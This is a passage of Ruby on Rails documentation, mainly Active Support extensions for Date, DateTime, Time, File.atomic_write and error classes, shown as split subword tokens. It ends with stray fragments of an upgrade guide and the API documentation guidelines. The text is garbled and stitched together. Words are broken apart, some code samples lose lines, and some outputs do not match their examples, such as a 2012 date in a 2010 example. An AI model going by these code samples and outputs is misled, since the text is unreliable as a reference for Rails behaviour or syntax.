▁date . advance ( months : ▁2, ▁days : ▁- 2 ) ▁# ▁=> ▁We d , ▁ 04 ▁A ug ▁2010
▁Note ▁in ▁the ▁previous ▁example ▁that ▁increment s ▁may ▁be ▁ n eg a tive .
▁To ▁perform ▁the ▁com put ation ▁the ▁method ▁first ▁increment s ▁ years , ▁the n ▁ months , ▁the n ▁ week s , ▁and ▁finally ▁days .
▁This ▁order ▁is ▁important ▁toward s ▁the ▁end ▁of ▁ months .
▁S a y ▁for ▁example ▁we ▁are ▁at ▁the ▁end ▁of ▁Feb ru ary ▁of ▁2010 , ▁and ▁we ▁want ▁to ▁move ▁one ▁ month ▁and ▁one ▁day ▁forward .
▁The ▁method ▁` advance ` ▁ advance s ▁first ▁one ▁ month , ▁and ▁the n ▁one ▁day , ▁the ▁result ▁is :
▁Date . new (201 0, ▁2, ▁28 ). advance ( months : ▁1, ▁days : ▁1)
▁# ▁=> ▁Sun , ▁29 ▁M ar ▁2010
▁Whi le ▁if ▁it ▁did ▁it ▁the ▁other ▁way ▁around ▁the ▁result ▁would ▁be ▁different :
▁Date . new (201 0, ▁2, ▁28 ). advance ( day s : ▁1) . advance ( months : ▁1)
▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010
▁#### ▁ Chang ing ▁Co mp on ent s
▁The ▁method ▁` change ` ▁allows ▁you ▁to ▁get ▁a ▁new ▁date ▁which ▁is ▁the ▁same ▁as ▁the ▁receiver ▁except ▁for ▁the ▁given ▁ year , ▁ month , ▁or ▁day :
▁Date . new (201 0, ▁ 12 , ▁ 23 ). change ( year : ▁ 2011 , ▁ month : ▁ 11 )
▁# ▁=> ▁We d , ▁ 23 ▁No v ▁ 2011
▁This ▁method ▁is ▁not ▁to ler ant ▁to ▁non - ex ist ing ▁date s , ▁if ▁the ▁change ▁is ▁invalid ▁` ArgumentError ` ▁is ▁raised :
▁Date . new (201 0, ▁1, ▁31). change ( month : ▁2 )
▁# ▁=> ▁ ArgumentError : ▁invalid ▁date
▁#### ▁D ur ation s
▁D ur ation s ▁can ▁be ▁added ▁to ▁and ▁sub tr ac t ed ▁from ▁date s :
▁d ▁= ▁Date . current
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010
▁d ▁ + ▁1. year
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁ 2011
▁d ▁- ▁3 . hour s
▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010 ▁2 1 : 00:00 ▁UTC ▁ + 00:00
▁They ▁tr an s l ate ▁to ▁calls ▁to ▁` since ` ▁or ▁` advance `.
▁For ▁example ▁here ▁we ▁get ▁the ▁correct ▁jump ▁in ▁the ▁c al end ar ▁re form :
▁Date . new ( 1582 , ▁10 , ▁4 ) ▁ + ▁1. day
▁# ▁=> ▁Fri , ▁ 15 ▁Oct ▁ 1582
▁#### ▁Time st am p s
▁INFO : ▁The ▁following ▁methods ▁return ▁a ▁` Time ` ▁object ▁if ▁possible , ▁otherwise ▁a ▁` DateTime `.
▁If ▁set , ▁they ▁honor ▁the ▁user ▁time ▁zone .
▁#### # ▁` beginning _ of _ day `, ▁` end _ of _ day `
▁The ▁method ▁` beginning _ of _ day ` ▁returns ▁a ▁timestamp ▁at ▁the ▁beginning ▁of ▁the ▁day ▁( 00 : 00:00 ) :
▁date . beginning _ of _ day ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁00:00:00 ▁ + 0 200 ▁2010
▁The ▁method ▁` end _ of _ day ` ▁returns ▁a ▁timestamp ▁at ▁the ▁end ▁of ▁the ▁day ▁( 23:59:59 ) :
▁date . end _ of _ day ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 23:59:59 ▁ + 0 200 ▁2010
▁#### # ▁` beginning _ of _ hour `, ▁` end _ of _ hour `
▁The ▁method ▁` beginning _ of _ hour ` ▁returns ▁a ▁timestamp ▁at ▁the ▁beginning ▁of ▁the ▁ hour ▁( h h : 00:00 ) :
▁date ▁= ▁ DateTime . new (201 0, ▁6 , ▁7 , ▁ 19 , ▁5 5 , ▁2 5 )
▁date . beginning _ of _ hour ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 00:00 ▁ + 0 200 ▁2010
▁The ▁method ▁` end _ of _ hour ` ▁returns ▁a ▁timestamp ▁at ▁the ▁end ▁of ▁the ▁ hour ▁( h h : 59 : 59 ) :
▁date . end _ of _ hour ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 59 : 59 ▁ + 0 200 ▁2010
▁` beginning _ of _ hour ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ hour `.
▁#### # ▁` beginning _ of _ minute `, ▁` end _ of _ minute `
▁The ▁method ▁` beginning _ of _ minute ` ▁returns ▁a ▁timestamp ▁at ▁the ▁beginning ▁of ▁the ▁ minute ▁( h h : m m : 00 ) :
▁date . beginning _ of _ minute ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 5 5 : 00 ▁ + 0 200 ▁2010
▁The ▁method ▁` end _ of _ minute ` ▁returns ▁a ▁timestamp ▁at ▁the ▁end ▁of ▁the ▁ minute ▁( h h : m m : 59 ) :
▁date . end _ of _ minute ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 5 5 : 59 ▁ + 0 200 ▁2010
▁` beginning _ of _ minute ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ minute `.
▁INFO : ▁` beginning _ of _ hour `, ▁` end _ of _ hour `, ▁` beginning _ of _ minute ` ▁and ▁` end _ of _ minute ` ▁are ▁implemented ▁for ▁` Time ` ▁and ▁` DateTime ` ▁but ▁** not ** ▁` Date ` ▁as ▁it ▁does ▁not ▁make ▁sense ▁to ▁request ▁the ▁beginning ▁or ▁end ▁of ▁an ▁ hour ▁or ▁ minute ▁on ▁a ▁` Date ` ▁instance .
▁#### # ▁` ago `, ▁` since `
▁The ▁method ▁` ago ` ▁receive s ▁a ▁number ▁of ▁second s ▁as ▁argument ▁and ▁returns ▁a ▁timestamp ▁those ▁many ▁second s ▁ ago ▁from ▁ midnight :
▁date ▁= ▁Date . current ▁# ▁=> ▁Fri , ▁ 11 ▁Jun ▁2010
▁date . ago (1) ▁# ▁=> ▁Thu , ▁10 ▁Jun ▁2010 ▁ 23:59:59 ▁E D T ▁- 04 : 00
▁Similar ly , ▁` since ` ▁move s ▁forward :
▁date . since (1) ▁# ▁=> ▁Fri , ▁ 11 ▁Jun ▁2010 ▁ 00:00 : 0 1 ▁E D T ▁- 04 : 00
▁#### ▁Other ▁Time ▁Co m put ation s
▁Extensions ▁to ▁` DateTime `
▁WARNING : ▁` DateTime ` ▁is ▁not ▁a w a re ▁of ▁D ST ▁rules ▁and ▁so ▁some ▁of ▁these ▁methods ▁have ▁edge ▁cases ▁when ▁a ▁D ST ▁change ▁is ▁going ▁on .
▁For ▁example ▁` second s _ since _ midnight ` ▁m ight ▁not ▁return ▁the ▁real ▁amount ▁in ▁such ▁a ▁day .
▁NOTE : ▁All ▁the ▁following ▁methods ▁are ▁defined ▁in ▁` active _ support / core _ ext / date _ time / calculations . rb `.
▁The ▁class ▁` DateTime ` ▁is ▁a ▁sub class ▁of ▁` Date ` ▁so ▁by ▁load ing ▁` active _ support / core _ ext / date / calculations . rb ` ▁you ▁inherit ▁these ▁methods ▁and ▁their ▁alias es , ▁except ▁that ▁they ▁will ▁always ▁return ▁ datetime s :
▁ yesterday
▁beginning _ of _ week ▁( at _ beginning _ of _ week )
▁end _ of _ week ▁( at _ end _ of _ week )
▁ monday
▁ sunday
▁ week s _ ago
▁ prev _ week ▁( last _ week )
▁next _ week
▁ months _ ago
▁ months _ since
▁beginning _ of _ month ▁( at _ beginning _ of _ month )
▁end _ of _ month ▁( at _ end _ of _ month )
▁ prev _ month ▁( last _ month )
▁next _ month
▁beginning _ of _ quarter ▁( at _ beginning _ of _ quarter )
▁end _ of _ quarter ▁( at _ end _ of _ quarter )
▁beginning _ of _ year ▁( at _ beginning _ of _ year )
▁end _ of _ year ▁( at _ end _ of _ year )
▁ years _ ago
▁ years _ since
▁ prev _ year ▁( last _ year )
▁next _ year
▁The ▁following ▁methods ▁are ▁re implement ed ▁so ▁you ▁do ▁** not ** ▁need ▁to ▁load ▁` active _ support / core _ ext / date / calculations . rb ` ▁for ▁these ▁one s :
▁beginning _ of _ day ▁( midnight , ▁at _ midnight , ▁at _ beginning _ of _ day )
▁end _ of _ day
▁since ▁( in )
▁On ▁the ▁other ▁hand , ▁` advance ` ▁and ▁` change ` ▁are ▁also ▁defined ▁and ▁support ▁more ▁options , ▁they ▁are ▁document ed ▁below .
▁The ▁following ▁methods ▁are ▁only ▁implemented ▁in ▁` active _ support / core _ ext / date _ time / calculations . rb ` ▁as ▁they ▁only ▁make ▁sense ▁when ▁used ▁with ▁a ▁` DateTime ` ▁instance :
▁beginning _ of _ hour ▁( at _ beginning _ of _ hour )
▁end _ of _ hour
▁#### ▁Name d ▁Date times
▁#### # ▁` DateTime . current `
▁Active ▁Support ▁defines ▁` DateTime . current ` ▁to ▁be ▁like ▁` Time . now . to _ datetime `, ▁except ▁that ▁it ▁honor s ▁the ▁user ▁time ▁zone , ▁if ▁defined .
▁It ▁also ▁defines ▁` DateTime . yesterday ` ▁and ▁` DateTime . to m or row `, ▁and ▁the ▁instance ▁predicate s ▁` past ?` , ▁and ▁` future ?` ▁relative ▁to ▁` DateTime . current `.
▁#### ▁Other ▁Extensions
▁#### # ▁` second s _ since _ midnight `
▁The ▁method ▁` second s _ since _ midnight ` ▁returns ▁the ▁number ▁of ▁second s ▁since ▁ midnight :
▁now ▁= ▁ DateTime . current ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁20 : 2 6 : 36 ▁ + 0000
▁now . second s _ since _ midnight ▁# ▁=> ▁7 3 59 6
▁#### # ▁` utc `
▁The ▁method ▁` utc ` ▁gives ▁you ▁the ▁same ▁ datetime ▁in ▁the ▁receiver ▁express ed ▁in ▁UTC .
▁now ▁= ▁ DateTime . current ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁ 19 : 27 : 5 2 ▁- 04 00
▁now . utc ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁ 23 : 27 : 5 2 ▁ + 0000
▁This ▁method ▁is ▁also ▁alias ed ▁as ▁` get utc `.
▁#### # ▁` utc ?
▁The ▁predicate ▁` utc ?` ▁say s ▁whether ▁the ▁receiver ▁has ▁UTC ▁as ▁its ▁time ▁zone :
▁now ▁= ▁ DateTime . now ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁ 19 : 3 0 : 4 7 ▁- 04 00
▁# ▁=> ▁true
▁The ▁most ▁generic ▁way ▁to ▁jump ▁to ▁another ▁ datetime ▁is ▁` advance `.
▁This ▁method ▁receive s ▁a ▁hash ▁with ▁keys ▁`: years `, ▁`: months `, ▁`: week s `, ▁`: day s `, ▁`: hour s `, ▁`: minute s `, ▁and ▁`: second s `, ▁and ▁returns ▁a ▁ datetime ▁advanced ▁as ▁much ▁as ▁the ▁present ▁keys ▁indicate .
▁d ▁= ▁ DateTime . current
▁# ▁=> ▁Thu , ▁0 5 ▁A ug ▁2010 ▁ 11 : 3 3 : 3 1 ▁ + 0000
▁d . advance ( years : ▁1, ▁ months : ▁1, ▁days : ▁1, ▁hours : ▁1, ▁minutes : ▁1, ▁second s : ▁1)
▁# ▁=> ▁Tue , ▁ 06 ▁Sep ▁ 2011 ▁ 12 : 34 : 3 2 ▁ + 0000
▁After ▁that , ▁it ▁a d j us t s ▁the ▁time ▁calling ▁` since ` ▁with ▁the ▁number ▁of ▁second s ▁to ▁ advance .
▁This ▁order ▁is ▁relevant , ▁a ▁different ▁order ing ▁would ▁give ▁different ▁ datetime s ▁in ▁some ▁edge - case s .
▁The ▁example ▁in ▁` Date # advance ` ▁applies , ▁and ▁we ▁can ▁extend ▁it ▁to ▁show ▁order ▁re le v ance ▁related ▁to ▁the ▁time ▁bit s .
▁If ▁we ▁first ▁move ▁the ▁date ▁bit s ▁( that ▁have ▁also ▁a ▁relative ▁order ▁of ▁process ing , ▁as ▁document ed ▁before ), ▁and ▁the n ▁the ▁time ▁bit s ▁we ▁get ▁for ▁example ▁the ▁following ▁com put ation :
▁d ▁= ▁ DateTime . new (201 0, ▁2, ▁28 , ▁ 23 , ▁ 59 , ▁ 59 )
▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010 ▁ 23:59:59 ▁ + 0000
▁d . advance ( months : ▁1, ▁second s : ▁1)
▁# ▁=> ▁Mon , ▁29 ▁M ar ▁2010 ▁00:00:00 ▁ + 0000
▁but ▁if ▁we ▁compute d ▁them ▁the ▁other ▁way ▁around , ▁the ▁result ▁would ▁be ▁different :
▁d . advance ( second s : ▁1) . advance ( months : ▁1)
▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010 ▁00:00:00 ▁ + 0000
▁WARNING : ▁S ince ▁` DateTime ` ▁is ▁not ▁D ST - a w a re ▁you ▁can ▁end ▁up ▁in ▁a ▁non - ex ist ing ▁point ▁in ▁time ▁with ▁no ▁warning ▁or ▁error ▁tell ing ▁you ▁so .
▁The ▁method ▁` change ` ▁allows ▁you ▁to ▁get ▁a ▁new ▁ datetime ▁which ▁is ▁the ▁same ▁as ▁the ▁receiver ▁except ▁for ▁the ▁given ▁options , ▁which ▁may ▁include ▁`: year `, ▁`: month `, ▁`: day `, ▁`: hour `, ▁`: m in `, ▁`: sec `, ▁`: offset `, ▁`: start ` :
▁now ▁= ▁ DateTime . current
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁01 : 5 6 : 22 ▁ + 0000
▁now . change ( year : ▁ 2011 , ▁ offset : ▁R ation al ( - 6 , ▁24 ) )
▁# ▁=> ▁We d , ▁ 08 ▁Jun ▁ 2011 ▁01 : 5 6 : 22 ▁- 06 00
▁If ▁hours ▁are ▁ zero ed , ▁the n ▁minutes ▁and ▁second s ▁are ▁too ▁( unless ▁they ▁have ▁given ▁values ) :
▁now . change ( hour : ▁0 )
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁00:00:00 ▁ + 0000
▁Similar ly , ▁if ▁minutes ▁are ▁ zero ed , ▁the n ▁second s ▁are ▁too ▁( unless ▁it ▁has ▁given ▁a ▁value ) :
▁now . change ( m in : ▁0 )
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁01 : 00:00 ▁ + 0000
▁ DateTime . current . change ( month : ▁2, ▁day : ▁30 )
▁D ur ation s ▁can ▁be ▁added ▁to ▁and ▁sub tr ac t ed ▁from ▁ datetime s :
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁ + 0000
▁now ▁ + ▁1. year
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁ 2011 ▁ 23 : 15 : 17 ▁ + 0000
▁now ▁- ▁1. week
▁# ▁=> ▁Mon , ▁ 02 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁ + 0000
▁ DateTime . new ( 1582 , ▁10 , ▁4 , ▁ 23 ) ▁ + ▁1. hour
▁# ▁=> ▁Fri , ▁ 15 ▁Oct ▁ 1582 ▁00:00:00 ▁ + 0000
▁Extensions ▁to ▁` Time `
▁NOTE : ▁All ▁the ▁following ▁methods ▁are ▁defined ▁in ▁` active _ support / core _ ext / time / calculations . rb `.
▁Active ▁Support ▁add s ▁to ▁` Time ` ▁many ▁of ▁the ▁methods ▁available ▁for ▁` DateTime ` :
▁ past ?
▁to day ?
▁future ?
▁second s _ since _ midnight
▁ advance
▁They ▁are ▁analogous .
▁P lease ▁refer ▁to ▁their ▁documentation ▁above ▁and ▁take ▁into ▁account ▁the ▁following ▁difference s :
▁* ▁` change ` ▁accept s ▁an ▁ additional ▁`: u sec ` ▁option .
▁* ▁` Time ` ▁understand s ▁D ST , ▁so ▁you ▁get ▁correct ▁D ST ▁ calculations ▁as ▁in
▁Time . zone _ default
▁# ▁=> ▁#< ActiveSupport :: Time Z one : 0 x 7 f 7 36 5 4 d 4 f 38 ▁@ utc _ offset = nil , ▁@ name =" M ad r id ", ▁...
▁# ▁In ▁B ar ce lo n a , ▁2010 / 0 3 / 28 ▁ 02 : 00 ▁ + 0 1 00 ▁becomes ▁2010 / 0 3 / 28 ▁0 3 : 00 ▁ + 0 200 ▁due ▁to ▁D ST .
▁t ▁= ▁Time . local (201 0, ▁3 , ▁28 , ▁1, ▁ 59 , ▁ 59 )
▁# ▁=> ▁Sun ▁M ar ▁28 ▁01 : 59 : 59 ▁ + 0 1 00 ▁2010
▁t . advance ( second s : ▁1)
▁# ▁=> ▁Sun ▁M ar ▁28 ▁0 3 : 00:00 ▁ + 0 200 ▁2010
▁* ▁If ▁` since ` ▁or ▁` ago ` ▁jump ▁to ▁a ▁time ▁that ▁can ' t ▁be ▁express ed ▁with ▁` Time ` ▁a ▁` DateTime ` ▁object ▁is ▁returned ▁instead .
▁#### ▁` Time . current `
▁Active ▁Support ▁defines ▁` Time . current ` ▁to ▁be ▁to day ▁in ▁the ▁current ▁time ▁zone .
▁That ' s ▁like ▁` Time . now `, ▁except ▁that ▁it ▁honor s ▁the ▁user ▁time ▁zone , ▁if ▁defined .
▁It ▁also ▁defines ▁the ▁instance ▁predicate s ▁` past ?` , ▁` to day ?` , ▁and ▁` future ?` , ▁all ▁of ▁them ▁relative ▁to ▁` Time . current `.
▁When ▁making ▁Time ▁comparison s ▁using ▁methods ▁which ▁honor ▁the ▁user ▁time ▁zone , ▁make ▁sure ▁to ▁use ▁` Time . current ` ▁instead ▁of ▁` Time . now `.
▁There ▁are ▁cases ▁where ▁the ▁user ▁time ▁zone ▁m ight ▁be ▁in ▁the ▁future ▁compare d ▁to ▁the ▁system ▁time ▁zone , ▁which ▁` Time . now ` ▁uses ▁by ▁default .
▁This ▁means ▁` Time . now . to _ date ` ▁may ▁equal ▁` Date . yesterday `.
▁#### ▁` all _ day `, ▁` all _ week `, ▁` all _ month `, ▁` all _ quarter ` ▁and ▁` all _ year `
▁The ▁method ▁` all _ day ` ▁returns ▁a ▁range ▁represent ing ▁the ▁whole ▁day ▁of ▁the ▁current ▁time .
▁now ▁= ▁Time . current
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁ 23 : 20 : 0 5 ▁UTC ▁ + 00:00
▁now . all _ day
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁00:00:00 ▁UTC ▁ + 00:00 . .
▁Mon , ▁09 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁ + 00:00
▁An a log ous ly , ▁` all _ week `, ▁` all _ month `, ▁` all _ quarter ` ▁and ▁` all _ year ` ▁all ▁serve ▁the ▁purpose ▁of ▁ generating ▁time ▁range s .
▁now . all _ week
▁Sun , ▁ 15 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁ + 00:00
▁now . all _ week (: sunday )
▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁20 12 ▁00:00:00 ▁UTC ▁ + 00:00 . .
▁S at , ▁ 22 ▁Sep ▁20 12 ▁ 23:59:59 ▁UTC ▁ + 00:00
▁now . all _ month
▁# ▁=> ▁S at , ▁01 ▁A ug ▁2010 ▁00:00:00 ▁UTC ▁ + 00:00 . .
▁Tue , ▁31 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁ + 00:00
▁now . all _ quarter
▁# ▁=> ▁Thu , ▁01 ▁Ju l ▁2010 ▁00:00:00 ▁UTC ▁ + 00:00 . .
▁Thu , ▁30 ▁Sep ▁2010 ▁ 23:59:59 ▁UTC ▁ + 00:00
▁now . all _ year
▁# ▁=> ▁Fri , ▁01 ▁Jan ▁2010 ▁00:00:00 ▁UTC ▁ + 00:00 . .
▁Fri , ▁31 ▁De c ▁2010 ▁ 23:59:59 ▁UTC ▁ + 00:00
▁### ▁Time ▁Co n str u c to r s
▁Time . current
▁# ▁=> ▁Fri , ▁ 06 ▁A ug ▁2010 ▁ 17 : 11 : 58 ▁C E ST ▁ + 02 : 00
▁An a log ous ly ▁to ▁` DateTime `, ▁the ▁predicate s ▁` past ?` , ▁and ▁` future ?` ▁are ▁relative ▁to ▁` Time . current `.
▁If ▁the ▁time ▁to ▁be ▁construct ed ▁ li es ▁ beyond ▁the ▁range ▁supported ▁by ▁` Time ` ▁in ▁the ▁runtime ▁platform , ▁use c s ▁are ▁d is card ed ▁and ▁a ▁` DateTime ` ▁object ▁is ▁returned ▁instead .
▁D ur ation s ▁can ▁be ▁added ▁to ▁and ▁sub tr ac t ed ▁from ▁time ▁objects :
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁ 2011 ▁ 23 : 2 1 : 11 ▁UTC ▁ + 00:00
▁# ▁=> ▁Mon , ▁ 02 ▁A ug ▁2010 ▁ 23 : 2 1 : 11 ▁UTC ▁ + 00:00
▁Time . utc ( 1582 , ▁10 , ▁3 ) ▁ + ▁5 . day s
▁# ▁=> ▁Mon ▁Oct ▁ 18 ▁00:00:00 ▁UTC ▁ 1582
▁Extensions ▁to ▁` File `
▁### ▁` atomic _ write `
▁With ▁the ▁class ▁method ▁` File . atomic _ write ` ▁you ▁can ▁write ▁to ▁a ▁file ▁in ▁a ▁way ▁that ▁will ▁prevent ▁any ▁reader ▁from ▁see ing ▁half - written ▁content .
▁The ▁name ▁of ▁the ▁file ▁is ▁passed ▁as ▁an ▁argument , ▁and ▁the ▁method ▁yields ▁a ▁file ▁handle ▁open ed ▁for ▁writing .
▁On ce ▁the ▁block ▁is ▁done ▁` atomic _ write ` ▁close s ▁the ▁file ▁handle ▁and ▁complete s ▁its ▁job .
▁For ▁example , ▁Action ▁Pack ▁uses ▁this ▁method ▁to ▁write ▁asset ▁cache ▁files ▁like ▁` all . css ` :
▁File . atomic _ write ( join ed _ asset _ path ) ▁do ▁| cache |
▁cache . write ( join _ asset _ file _ content s ( asset _ path s ) )
▁To ▁accomplish ▁this ▁` atomic _ write ` ▁creates ▁a ▁temporary ▁file .
▁That ' s ▁the ▁file ▁the ▁code ▁in ▁the ▁block ▁actually ▁write s ▁to .
▁On ▁com p let ion , ▁the ▁temporary ▁file ▁is ▁re name d , ▁which ▁is ▁an ▁ atomic ▁operation ▁on ▁P O S I X ▁systems .
▁If ▁the ▁target ▁file ▁exists ▁` atomic _ write ` ▁overwrit es ▁it ▁and ▁keep s ▁own ers ▁and ▁ permission s .
▁However ▁there ▁are ▁a ▁few ▁cases ▁where ▁` atomic _ write ` ▁cannot ▁change ▁the ▁file ▁own ers h ip ▁or ▁ permission s , ▁this ▁error ▁is ▁ ca ug h t ▁and ▁skip ped ▁over ▁tr us ting ▁in ▁the ▁user / file system ▁to ▁ensure ▁the ▁file ▁is ▁accessible ▁to ▁the ▁process es ▁that ▁need ▁it .
▁NOTE . ▁D ue ▁to ▁the ▁ ch mod ▁operation ▁` atomic _ write ` ▁perform s , ▁if ▁the ▁target ▁file ▁has ▁an ▁A C L ▁set ▁on ▁it ▁this ▁A C L ▁will ▁be ▁re c al c ul at ed / mod if i ed .
▁WARNING . ▁Note ▁you ▁can ' t ▁app end ▁with ▁` atomic _ write `.
▁The ▁aux i li ary ▁file ▁is ▁written ▁in ▁a ▁standard ▁directory ▁for ▁temporary ▁files , ▁but ▁you ▁can ▁pass ▁a ▁directory ▁of ▁your ▁choice ▁as ▁second ▁argument .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / file / atomic . rb `.
▁Extensions ▁to ▁` M ar s h al `
▁### ▁` load `
▁Active ▁Support ▁add s ▁constant ▁ autoload ing ▁support ▁to ▁` load `.
▁For ▁example , ▁the ▁file ▁cache ▁store ▁ de serialize s ▁this ▁way :
▁File . open ( file _ name ) ▁ { ▁| f | ▁M ar s h al . load ( f ) ▁ }
▁If ▁the ▁cached ▁data ▁refer s ▁to ▁a ▁constant ▁that ▁is ▁ unknown ▁at ▁that ▁point , ▁the ▁ autoload ing ▁ mechanism ▁is ▁trigger ed ▁and ▁if ▁it ▁succeed s ▁the ▁ de se rial i z ation ▁is ▁re tr i ed ▁tr an s parent ly .
▁WARNING . ▁If ▁the ▁argument ▁is ▁an ▁` I O ` ▁it ▁needs ▁to ▁respond ▁to ▁` re w in d ` ▁to ▁be ▁able ▁to ▁re try .
▁R egular ▁files ▁respond ▁to ▁` re w in d `.
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / m ar s h al . rb `.
▁Extensions ▁to ▁` Name Error `
▁Active ▁Support ▁add s ▁` missing _ name ?` ▁to ▁` Name Error `, ▁which ▁tests ▁whether ▁the ▁exception ▁was ▁raised ▁because ▁of ▁the ▁name ▁passed ▁as ▁argument .
▁The ▁name ▁may ▁be ▁given ▁as ▁a ▁symbol ▁or ▁string .
▁A ▁symbol ▁is ▁test ed ▁again st ▁the ▁bar e ▁constant ▁name , ▁a ▁string ▁is ▁again st ▁the ▁fully - qualified ▁constant ▁name .
▁TIP : ▁A ▁symbol ▁can ▁represent ▁a ▁fully - qualified ▁constant ▁name ▁as ▁in ▁`: " ActiveRecord :: Base " `, ▁so ▁the ▁behavior ▁for ▁symbols ▁is ▁defined ▁for ▁convenience , ▁not ▁because ▁it ▁has ▁to ▁be ▁that ▁way ▁technical ly .
▁For ▁example , ▁when ▁an ▁action ▁of ▁` Article sController ` ▁is ▁called ▁Rails ▁ tries ▁ o ptimistic ally ▁to ▁use ▁` Article s Helper `.
▁It ▁is ▁O K ▁that ▁the ▁helper ▁module ▁does ▁not ▁exist , ▁so ▁if ▁an ▁exception ▁for ▁that ▁constant ▁name ▁is ▁raised ▁it ▁should ▁be ▁ s il ence d .
▁But ▁it ▁could ▁be ▁the ▁case ▁that ▁` articles _ helper . rb ` ▁raise s ▁a ▁` Name Error ` ▁due ▁to ▁an ▁actual ▁ unknown ▁constant .
▁That ▁should ▁be ▁re raise d .
▁The ▁method ▁` missing _ name ?` ▁provides ▁a ▁way ▁to ▁distinguish ▁both ▁cases :
▁def ▁default _ helper _ module !
▁module _ name ▁= ▁name . sub ( / Controller $ / , ▁ '')
▁module _ path ▁= ▁module _ name . underscore
▁helper ▁module _ path
▁raise ▁e ▁unless ▁e . is _ missing ?
▁" helpers / # { module _ path } _ helper "
▁raise ▁e ▁unless ▁e . missing _ name ?
▁" # { module _ name } Helper "
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / name _ error . rb `.
▁Extensions ▁to ▁` L o ad Error `
▁G ive n ▁a ▁path ▁name ▁` is _ missing ?` ▁tests ▁whether ▁the ▁exception ▁was ▁raised ▁due ▁to ▁that ▁particular ▁file ▁( except ▁p erhaps ▁for ▁the ▁" . rb " ▁extension ).
▁For ▁example , ▁when ▁an ▁action ▁of ▁` Article sController ` ▁is ▁called ▁Rails ▁ tries ▁to ▁load ▁` articles _ helper . rb `, ▁but ▁that ▁file ▁may ▁not ▁exist .
▁That ' s ▁fine , ▁the ▁helper ▁module ▁is ▁not ▁m and a tory ▁so ▁Rails ▁ s il ence s ▁a ▁load ▁error .
▁But ▁it ▁could ▁be ▁the ▁case ▁that ▁the ▁helper ▁module ▁does ▁exist ▁and ▁in ▁turn ▁requires ▁another ▁library ▁that ▁is ▁missing .
▁In ▁that ▁case ▁Rails ▁must ▁re raise ▁the ▁exception .
▁The ▁method ▁` is _ missing ?` ▁provides ▁a ▁way ▁to ▁distinguish ▁both ▁cases :
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / load _ error . rb `.
▁If ▁you ▁want ▁them ▁to ▁run ▁in ▁other ▁environments ▁consult ▁the
▁[ S p r ing ▁README ]( https :// github . com / rails / spring # rake ).
▁You ▁must ▁replace ▁any ▁plugin s ▁by ▁extract ing ▁them ▁to ▁gems ▁and ▁adding ▁them ▁to ▁your ▁Gemfile .
▁# ▁self . include _ root _ in _ json ▁= ▁false
▁get ▁' c la s h ing / : id ' ▁=> ▁' test # example ' , ▁as : ▁: example
▁API ▁Documentation ▁G u id e line s
▁This ▁guide ▁document s ▁the ▁Ruby ▁on ▁Rails ▁API ▁documentation ▁guide line s .
▁* ▁How ▁to ▁write ▁effective ▁pro se ▁for ▁documentation ▁purposes .
▁* ▁S t y le ▁guide line s ▁for ▁document ing ▁different ▁kind s ▁of ▁Ruby ▁code .
▁The ▁[ Rails ▁API ▁documentation ]( http :// api . rubyonrails . org ) ▁is ▁generated ▁with < n >[ RDoc ]( http :// doc s . s eattle rb . org / rdoc / ).
▁bundle ▁exec ▁rake ▁ rdoc
▁Re s ul ting ▁HTML ▁files ▁can ▁be ▁found ▁in ▁the ▁ . / doc / rdoc ▁directory .
▁P lease ▁consult ▁the ▁ RDoc ▁documentation ▁for ▁help ▁with ▁the < n >[ m ar k up ]( http :// doc s . s eattle rb . org / rdoc / RDoc / M ar k up . html ), < n > and ▁also ▁take ▁into ▁account ▁these ▁[ additional < n > d ir ec tive s ]( http :// doc s . s eattle rb . org / rdoc / RDoc / P ar s er / Ruby . html ).
▁ Word ing
▁Writ e ▁simple , ▁declar a tive ▁ sentence s .
▁B re v ity ▁is ▁a ▁plus : ▁get ▁to ▁the ▁point .
▁Writ e ▁in ▁present ▁te n se : ▁" Re t ur n s ▁a ▁hash ▁that ..." , ▁rather ▁than ▁" Re t ur n ed ▁a ▁hash ▁that ..." ▁or ▁" W i ll ▁return ▁a ▁hash ▁that ..." .
▁Start ▁comments ▁in ▁upper ▁case .
▁Follow ▁regular ▁p un c t u ation ▁rules :
▁# ▁De c la re s ▁an ▁attribute ▁reader ▁back ed ▁by ▁an ▁internally - name d
▁# ▁instance ▁variable .
▁def ▁ attr _ internal _ reader ( * attr s )
